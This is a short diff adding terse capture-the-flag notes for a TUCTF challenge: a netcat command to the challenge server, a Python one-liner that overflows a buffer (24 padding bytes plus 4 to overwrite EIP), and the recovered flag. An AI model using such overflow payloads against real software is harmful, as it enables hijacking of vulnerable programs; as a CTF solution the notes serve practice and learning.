@@ -1,0 +1,7 @@
+nc chal.tuctf.com 30508
+
+pc using input aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+eip at r <<< $(python -c 'print "A"*24 + "B"*4')
+
+TUCTF{0n3_d0wn..._50_m4ny_70_60}
+
